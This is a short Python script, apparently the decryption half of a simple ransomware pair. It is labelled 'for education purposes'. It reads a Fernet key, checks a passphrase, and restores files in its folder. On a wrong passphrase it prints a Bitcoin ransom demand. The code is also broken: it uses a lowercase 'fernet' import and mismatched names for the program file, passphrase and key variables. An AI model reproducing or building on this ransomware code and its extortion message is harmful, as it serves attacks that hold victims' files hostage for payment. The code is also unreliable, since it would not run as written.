# -- Only for Education Purposes (I am not responsible for any misuse of the programs) -- #

#!/usr/bin/env/ python3

import os
from cryptography.fernet import fernet

ENCRYPTION_PROGRAM = "kagi.py"
KEY_FILE = "thekey.key"
DECRYPTION_PROGRAM = "hiraku.py"

SECRET_PHRASE = "DontTellMyWife_Th1sPassw0rd"

files = []

# Find files in the same directory as this program
for file in os.listdir():
    if file == ENCRYPTOR_PROGRAM or file == KEY_FILE or file == DECRYPTOR_PROGRAM:
        continue
    if os.path.isfile(file):
        files.append(file)

if len(files) != 0:
    print("Files: ", files)
else:
    print("No files found...")

# I am not going to generate a key in this decryption program...
# key = Fernet.generate_key()

# Instead of 'wb' (write), I am going to open ('rb') the generated key provided by the encryption program
with open(KEY_FILE, "rb") as thekey:
    # thekey.write(key)
    secretkey = thekey.read()

user_phrase = input("Enter the secret phrase to decrypt your files :")

if user_phrase == secretphrase:
    for file in files:
        # Step-1: get the file content
        with open(file, "rb") as thefile: # <- rb = read binary
            contents = thefile.read()
        
        # Step-2: decrypt the file content and store it in a variable named 'contents_decrypted'
        # contents_encrypted = Fernet(key).encrypt(contents)
        contents_decrypted = Fernet(key).decrypt(contents)
        
        # Step-3: overwrite that file's content with the previously encrypted one
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    
    print("Okay, you can have your files back now")
else:
    print("Wrong passphrase. Send me more Bitcoins asap, else you could lose your files!")
